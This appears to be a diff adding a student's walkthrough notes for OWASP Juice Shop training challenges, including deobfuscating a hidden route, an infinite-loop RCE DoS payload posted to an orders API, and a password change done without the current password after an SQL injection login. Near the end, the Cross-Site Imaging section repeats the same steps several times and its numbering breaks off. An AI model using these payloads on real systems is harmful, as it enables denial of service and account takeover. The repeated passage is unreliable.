@@ -636,5 +636,126 @@ Challenge: Vulnerable Library
 ==== 5 Stars ====
 
 Challenge: Blockchain Hype
+1. Looking at debugger, interesting files/paths are:
+	a. https://ponzico.win/ponzico.pdf 
+	b. juicycoin 
+	c. app-token-sale
+2. In main-es2018.js, we have a code block related to 1c..
+
+function (t) {
+return 0 === t.length ? null : t[0].toString().match(function (...t) {
+let e = Array.prototype.slice.call([25,
+184,
+174,
+179,
+182,
+186]),
+a = e.shift();
+return e.reverse().map((function (t, e) {
+return String.fromCharCode(t - a - 45 - e)
+})).join('')
+}() + 36669.toString(36).toLowerCase() + function (...t) {
+let e = Array.prototype.slice.call(arguments),
+a = e.shift();
+return e.reverse().map((function (t, e) {
+return String.fromCharCode(t - a - 24 - e)
+})).join('')
+}(13, 144, 87, 152, 139, 144, 83, 138) + 10.toString(36).toLowerCase()) ? {
+consumed: t
+}
+
+3. Adding () to function statements and NUMBER.toString(36) modifies the function to be
+
+console.log("" + (function (...t) {
+let e = Array.prototype.slice.call([25,
+184,
+174,
+179,
+182,
+186]),
+a = e.shift();
+return e.reverse().map((function (t, e) {
+return String.fromCharCode(t - a - 45 - e)
+})).join('')
+})() + (36669).toString(36).toLowerCase() + (function (...t) {
+let e = Array.prototype.slice.call(arguments),
+a = e.shift();
+return e.reverse().map((function (t, e) {
+return String.fromCharCode(t - a - 24 - e)
+})).join('')
+}(13, 144, 87, 152, 139, 144, 83, 138)) + (10).toString(36).toLowerCase())
+
+4. The above yields "tokensale-ico-ea" and we add that to url path http://localhost:3000/#/tokensale-ico-ea
+5. Challenge Completed. 
+
+Challenge: Blocked RCE DoS
+1. I looked at the solution to get an idea on how to start. https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html --> localhost:3000/api-docs
+2.  In it are 5 schemas and a POST Request for /orders endpoint. 
+3. The code block when trying out the POST Request for /orders
+
+{
+  "cid": "JS0815DE",
+  "orderLines": [
+    {
+      "productId": 8,
+      "quantity": 500,
+      "customerReference": "PO0000001"
+    }
+  ],
+  "orderLinesData": "[{\"productId\": 12,\"quantity\": 10000,\"customerReference\": [\"PO0000001.2\", \"SM20180105|042\"],\"couponCode\": \"pes[Bh.u*t\"},{\"productId\": 13,\"quantity\": 2000,\"customerReference\": \"PO0000003.4\"}]"
+}
+
+4. The execute button creates a curl request for the above JSON object to http://localhost:3000/b2b/v2/orders and a 401 status code is returned when no authorisation header was found and a 200 status code is returned when a new customer order is succesfully created. 
+5. We can log in as any user with SQL Injection and steal the authorisation token. Executing the same code block now yields 200 status code. 
+6. We realise that the url is now http://localhost:3000/api-docs/#/Order/post_orders
+7. POSTING 
+{
+  "cid": "sleep(2)",
+  "orderLines": [
+    {
+      "productId": 8,
+      "quantity": 500,
+      "customerReference": "PO0000001"
+    }
+  ],
+  "orderLinesData": "(function a() {while(true);})()"
+}
+solves the challenge.
 
 
+Challenge: Change Bender's Password
+1. Log in as anyone and use burpsuite to capture all requests when using Forget Password Form.
+2. We see a GET Request made to the endpoint GET /rest/user/change-password?current=password&new=password!&repeat=password! 
+	a. the current, new and repeat password values are leaked in the url. 
+3. With some experimentations, we realise that we are able to update an account with a new password without sending the current
+GET /rest/user/change-password?new=password!&repeat=password! 
+--> gives 200 status code.
+4. Login as bender using SQL injection. 
+5. Send a Forget Password Form and capture it with burpsuite. With Repeater, manipulate the failed Request with 
+GET /rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
+6. Challenge Completed. 
+
+Challenge: Cross-Site Imaging
+1. The description: Stick cute cross-domain kittens all over our delivery boxes suggest to explore the only page on Juice Shop with delivery boxes --> localhost:3000/#/deluxe-membership
+2. Inspecting Element on the Image of delivery boxes, we get the url to that asset as assets/public/images/deluxe/blankBoxes.png 
+<svg _ngcontent-oig-c220="" viewBox="0 0 720 720" xmlns="http://www.w3.org/2000/svg">
+  <image _ngcontent-oig-c220="" href="assets/public/images/deluxe/blankBoxes.png" x="0" y="0" height="720" width="720"></image>
+  <image _ngcontent-oig-c220="" x="260" y="130" height="50" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="230" y="330" height="70" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="70" y="355" height="40" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="120" y="450" height="55" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="500" y="410" height="45" href="assets/public/images/JuiceShop_Logo.png"></image></svg>
+3. These 6 images assets are the same and exactly the number of the JS sticker on the delivery boxes at localhost:3000/#/deluxe-membership and are encapsulated in svg html tag. 
+2. Inspecting Element on the Image of delivery boxes, we get the url to that asset as assets/public/images/deluxe/blankBoxes.png 
+<svg _ngcontent-oig-c220="" viewBox="0 0 720 720" xmlns="http://www.w3.org/2000/svg">
+  <image _ngcontent-oig-c220="" href="assets/public/images/deluxe/blankBoxes.png" x="0" y="0" height="720" width="720"></image>
+  <image _ngcontent-oig-c220="" x="260" y="130" height="50" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="230" y="330" height="70" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="70" y="355" height="40" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="120" y="450" height="55" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="500" y="410" height="45" href="assets/public/images/JuiceShop_Logo.png"></image></svg>
+3. These 6 images assets are the same and exactly the number of the JS sticker on the delivery boxes at localhost:3000/#/deluxe-membership and are encapsulated in svg html tag.2. Inspecting Element on the Image of delivery boxes, we get the url to that asset as assets/public/images/deluxe/blankBoxes.png 
+<svg _ngcontent-oig-c220="" viewBox="0 0 720 720" xmlns="http://www.w3.org/2000/svg">
+  <image _ngcontent-oig-c220="" href="assets/public/images/deluxe/blankBoxes.png" x="0" y="0" height="720" width="720"></image>
+  <image _ngcontent-oig-c220="" x="260" y="130" height="50" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="230" y="330" height="70" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="70" y="355" height="40" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="120" y="450" height="55" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="500" y="410" height="45" href="assets/public/images/JuiceShop_Logo.png"></image></svg>
+3. These 6 images assets are the same and exactly the number of the JS sticker on the delivery boxes at localhost:3000/#/deluxe-membership and are encapsulated in svg html tag.2. Inspecting Element on the Image of delivery boxes, we get the url to that asset as assets/public/images/deluxe/blankBoxes.png 
+<svg _ngcontent-oig-c220="" viewBox="0 0 720 720" xmlns="http://www.w3.org/2000/svg">
+  <image _ngcontent-oig-c220="" href="assets/public/images/deluxe/blankBoxes.png" x="0" y="0" height="720" width="720"></image>
+  <image _ngcontent-oig-c220="" x="260" y="130" height="50" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="230" y="330" height="70" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="70" y="355" height="40" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="120" y="450" height="55" href="assets/public/images/JuiceShop_Logo.png"></image><image _ngcontent-oig-c220="" x="500" y="410" height="45" href="assets/public/images/JuiceShop_Logo.png"></image></svg>
+3. These 6 images assets are the same and exactly the number of the JS sticker on the delivery boxes at localhost:3000/#/deluxe-membership and are encapsulated in svg html tag.
+3. There are 2 images used here:
+	a. JuiceShop_Logo.png
+	b. BlankBoxes.png
+4. In debugger main-es2018.js, we see a code snippet this.logoSrc = 'assets/public/images/JuiceShop_Logo.png'. This is not very useful in itself. Let's look for references to these resources in the js file.
